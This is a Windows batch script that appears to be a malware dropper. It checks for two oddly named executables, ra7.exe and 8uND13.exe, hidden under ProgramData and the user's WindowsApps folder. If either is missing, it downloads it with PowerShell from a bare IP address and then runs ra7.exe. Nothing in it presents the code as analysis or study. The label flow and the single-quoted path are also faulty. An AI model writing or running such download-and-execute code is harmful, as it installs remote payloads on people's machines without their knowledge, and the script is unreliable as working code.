@echo off

IF NOT EXIST C:\ProgramData\ra7.exe (
   GOTO REDOWN1
)

IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe' (
   GOTO REDOWN2
)

:REDOWN1
   powershell -Command "Invoke-WebRequest http://184.171.144.131/ra7.exe -OutFile C:\ProgramData\ra7.exe"

:REDOWN2
   powershell -Command "Invoke-WebRequest http://184.171.144.131/8uND13.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe'"

powershell -Command "& C:\ProgramData\ra7.exe"
